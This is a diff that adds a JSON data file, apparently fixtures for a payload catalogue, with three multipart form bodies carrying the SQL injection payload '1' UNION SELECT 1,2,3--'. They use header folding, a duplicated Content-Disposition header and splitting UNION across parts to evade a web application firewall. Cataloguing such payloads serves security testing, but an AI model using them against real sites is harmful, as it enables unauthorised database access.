@@ -1,0 +1,28 @@
+{
+  "schemaVersion": 1,
+  "entries": [
+    {
+      "id": "sqli-carrier-multipart",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "------WebKitFormBoundary ⏎ Content-Disposition: form-data; ⏎  name=\"id\" ⏎ (空行) ⏎ 1' UNION SELECT 1,2,3-- ⏎ ------WebKitFormBoundary--",
+          "command": "------WebKitFormBoundary\nContent-Disposition: form-data;\n name=\"id\"\n\n1' UNION SELECT 1,2,3--\n------WebKitFormBoundary--"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "------WebKitFormBoundary ⏎ Content-Disposition: form-data; name=\"id\" ⏎ Content-Disposition: form-data; name=\"id\" ⏎ (空行) ⏎ ' UNION SELECT 1,2,3-- ⏎ ------WebKitFormBoundary--",
+          "command": "------WebKitFormBoundary\nContent-Disposition: form-data; name=\"id\"\nContent-Disposition: form-data; name=\"id\"\n\n' UNION SELECT 1,2,3--\n------WebKitFormBoundary--"
+        },
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "------WebKitFormBoundary ⏎ Content-Disposition: form-data; name=\"id\" ⏎ (空行) ⏎ 1' UNI ⏎ ------WebKitFormBoundary ⏎ Content-Disposition: form-data; name=\"id\" ⏎ (空行) ⏎ ON SELECT 1,2,3-- ⏎ ------WebKitFormBoundary--",
+          "command": "------WebKitFormBoundary\nContent-Disposition: form-data; name=\"id\"\n\n1' UNI\n------WebKitFormBoundary\nContent-Disposition: form-data; name=\"id\"\n\nON SELECT 1,2,3--\n------WebKitFormBoundary--"
+        }
+      ]
+    }
+  ]
+}
